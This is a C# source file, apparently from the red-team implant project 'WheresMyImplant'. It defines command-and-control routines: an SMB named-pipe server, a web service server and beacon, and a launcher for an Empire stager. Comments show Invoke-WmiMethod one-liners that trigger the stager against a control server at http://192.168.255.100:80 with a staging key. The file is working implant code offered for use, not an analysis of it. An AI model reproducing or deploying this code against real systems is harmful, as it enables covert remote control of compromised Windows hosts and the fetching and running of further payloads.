using System;

using Empire;

namespace WheresMyImplant
{
    public class C2
    {
        //FormalChicken
        public static void StartSmbServer(String pipeName)
        {
            Console.WriteLine("Starting SMB Server");
            while (true)
            {
                using (SMBServer smbServer = new SMBServer(pipeName))
                {
                    smbServer.WaitForConnection();
                    smbServer.MainLoop();
                }
            }
        }

        //GothTurkey
        public static void StartWebServiceServer(String serviceName, String port)
        {
            Console.WriteLine("Starting Web Service");
            WebService webService = new WebService(serviceName, port);
        }

        //DiscoChicken
        public static void StartWebServiceBeacon(String socket, String provider, String retries)
        {
            Int32 retriesCount;
            if (!Int32.TryParse(retries, out retriesCount))
            {
                retriesCount = 0;
            }

            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
            {
                Console.WriteLine("Starting Web Servic Beacon");
                webServiceBeacon.SetRetries(retriesCount);
                webServiceBeacon.Run();
            }
        }

        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "dotnet","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
        public static void Empire(String server, String stagingKey, String language)
        {
            try
            {
                EmpireStager empireStager = new EmpireStager(server, stagingKey, language);
                empireStager.execute();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}